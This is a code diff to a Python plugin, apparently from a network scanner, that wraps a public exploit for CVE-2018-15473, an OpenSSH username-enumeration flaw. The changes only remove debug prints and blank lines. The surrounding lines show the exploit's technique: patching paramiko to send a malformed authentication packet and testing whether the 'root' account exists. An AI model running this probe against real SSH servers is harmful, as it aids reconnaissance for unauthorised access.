@@ -14,11 +14,6 @@ https://github.com/Rhynorater/CVE-2018-15473-Exploit
 """
 
 import warnings
-
-
-
-
-
 import paramiko
 import core.logger as log
 from .IPlugin import IPlugin, connection_type
@@ -36,7 +31,6 @@ def call_error(*args, **kwargs):
     raise BadUsername()
 
 def malform_packet(*args, **kwargs):
-	print("forge malgormed")
 	old_add_boolean = paramiko.message.Message.add_boolean
 	paramiko.message.Message.add_boolean = add_boolean
 	result  = old_parse_service_accept(*args, **kwargs)
@@ -49,12 +43,10 @@ paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FA
 def checkUsername(socket, username, tried=0):
 	transport = paramiko.transport.Transport(socket)
 	try:
-		print("try")
 		transport.start_client()
 		a = transport.get_banner()
 		if a:
 			print("BANNER=>", a)
-		print("clean")
 	except paramiko.ssh_exception.SSHException:
 		print("EXCEPTION no ", tried)
 		transport.close()
@@ -83,9 +75,7 @@ class Plugin(IPlugin):
 		pass
 
 	def exec(self, socket):
-		print("exec")
 		res = checkUsername(socket, "root")
 		if res:
 			print("->",res)
-		log.info("Running my custom plugin")
 		pass
